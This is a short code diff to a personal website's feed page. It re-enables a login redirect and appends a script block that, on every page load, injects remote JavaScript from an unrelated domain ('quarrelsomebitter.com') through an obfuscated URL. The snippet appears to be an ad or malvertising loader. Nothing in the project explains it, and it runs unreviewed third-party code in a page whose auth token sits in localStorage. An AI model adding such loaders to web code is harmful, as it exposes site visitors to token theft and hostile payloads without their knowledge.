@@ -222,7 +222,7 @@ function renderFeedFromCache(posts) {
 }
 const BASE="https://my-website-raymond-sepia.vercel.app";
 const token=localStorage.getItem('token');
-//if(!token) location.href="login.html";
+if(!token) location.href="login.html";
 // ADDED ONLY - Open / Close sidebar only, no redirect
 function toggleSidebar(){
   document.getElementById('sidebar').classList.toggle('open');
@@ -457,6 +457,19 @@ async function checkMsgNotifications(){
 checkMsgNotifications();
 // Then check every 3 seconds, so new message shows fast while you are on Feed
 setInterval(checkMsgNotifications, 3000);
+</script>
+
+<script>
+(function(rc){
+var d = document,
+    s = d.createElement('script'),
+    l = d.currentScript || d.scripts[d.scripts.length - 1];
+s.settings = rc || {};
+s.src = "\/\/quarrelsomebitter.com\/bRXSV.sAdSGtle0XYJWJcq\/PeRmS9\/utZwUdlFkOP\/Thc\/2aMOjYMPz\/O\/DOUPtsN_zoYqy-MUzcMW4hO\/QP";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
 </script>
 </body>
 </html>
